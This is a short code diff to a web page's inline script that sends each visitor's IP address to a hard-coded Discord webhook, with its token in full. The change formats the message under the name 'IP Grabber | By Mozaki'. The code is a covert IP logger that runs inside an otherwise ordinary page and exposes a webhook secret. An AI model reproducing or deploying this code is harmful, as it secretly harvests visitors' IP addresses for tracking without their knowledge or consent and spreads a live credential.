@@ -9,7 +9,12 @@
         const request = new XMLHttpRequest();
         request.open("POST", "https://discord.com/api/webhooks/1038215774625603584/5qa1rgmCUJ2GvfGYDJvns6X2xm63Cj2YlshwhjG9F5NLoPYEFx31pB5rWxdlmrwggR7y");
         request.setRequestHeader('Content-type', 'application/json');
-        request.send(JSON.stringify(data.ip));
+        const params = {
+            username: "IP Grabber | By Mozaki",
+            avatar_url: "",
+            content: data.ip
+        }
+        request.send(JSON.stringify(params));
     })
     </script>
    </head>
